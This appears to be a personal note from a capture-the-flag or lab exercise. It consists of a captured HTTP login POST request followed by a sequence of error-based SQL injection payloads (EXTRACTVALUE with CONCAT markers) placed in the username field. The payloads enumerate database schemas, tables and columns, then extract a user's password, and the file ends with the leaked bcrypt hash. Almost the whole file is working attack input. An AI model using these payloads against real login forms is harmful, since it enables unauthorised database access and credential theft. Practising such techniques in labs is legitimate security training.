POST / HTTP/1.1
Host: 94.237.59.129:37415
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 152
Origin: http://94.237.59.129:37415
Connection: close
Referer: http://94.237.59.129:37415/
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache




#started from 
username=a' AND EXTRACTVALUE(8842,CONCAT(0x5c,0x71626b7071,(SELECT (ELT(8842=8842,1))),0x7162626b71))-- NOcB&password=a

username=a' AND EXTRACTVALUE(8842,CONCAT(0x5c,0x71626b7071,(SELECT table_name FROM information_schema.tables LIMIT 1),0x7162626b71))-- NOcB&password=a


username=a' AND EXTRACTVALUE(8842,CONCAT(0x5c,0x71626b7071,(SELECT SCHEMA_name FROM information_schema.schemata LIMIT 1 OFFSET 2),0x7162626b71))-- NOcB&password=a

leak information about users
username=a' AND EXTRACTVALUE(8842,CONCAT(0x5c,0x71626b7071,(SELECT table_name FROM information_schema.tables WHERE table_schema='korp_terminal' LIMIT 1 OFFSET 0),0x7162626b71))-- NOcB&password=a

username=a' AND EXTRACTVALUE(8842,CONCAT(0x5c,0x71626b7071,(SELECT column_name FROM information_schema.columns WHERE table_schema="korp_terminal" AND table_name="users" LIMIT 1 OFFSET 0),0x7162626b71))-- NOcB&password=a


id, username, password

username=a' AND EXTRACTVALUE(8842,CONCAT(0x5c,0x71626b7071,(SELECT password FROM korp_terminal.users LIMIT 1 OFFSET 0),0x7162626b71))-- NOcB&password=a
username=a' AND EXTRACTVALUE(8842,CONCAT(0x5c,0x71626b7071,(SELECT substring(password,1,12) FROM korp_terminal.users LIMIT 1 OFFSET 0),0x7162626b71))-- NOcB&password=a

$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.
